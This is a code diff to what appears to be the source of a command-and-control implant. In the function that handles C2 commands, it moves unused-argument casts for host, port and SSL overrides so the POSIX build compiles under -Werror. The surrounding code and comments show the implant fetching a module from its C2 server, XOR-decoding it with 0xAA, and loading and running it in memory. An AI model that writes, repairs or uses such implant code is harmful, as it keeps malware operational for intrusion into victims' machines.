@@ -1544,6 +1544,14 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         if (iss >> tok) r_host = tok;
         if (iss >> tok) r_port = std::atoi(tok.c_str());
         if (iss >> tok) r_ssl = std::atoi(tok.c_str());
+        // Every platform ignores these overrides: the fetched module keeps
+        // its own compiled C2 configuration. Keep accepting the legacy
+        // trailing arguments, but document that they are intentionally not
+        // consumed here (the old casts lived only in the Windows branch,
+        // which made the POSIX build fail under -Werror).
+        (void)r_host;
+        (void)r_port;
+        (void)r_ssl;
 #ifdef _WIN32
         // The fetch always targets the configured C2 (http_request uses
         // cfg.host/cfg.port). The path carries NO query string: the
@@ -1573,9 +1581,6 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         // TLS callbacks and calls its entry point. The remote module keeps
         // its own compiled C2 config (argv is ignored when the inherited
         // beacon command line is not a valid host/port pair).
-        (void)r_host;
-        (void)r_port;
-        (void)r_ssl;
         std::vector<unsigned char> mem(bin.begin(), bin.end());
         for (auto& octet : mem) octet = (unsigned char)(octet ^ 0xAA);
         std::string mem_err;
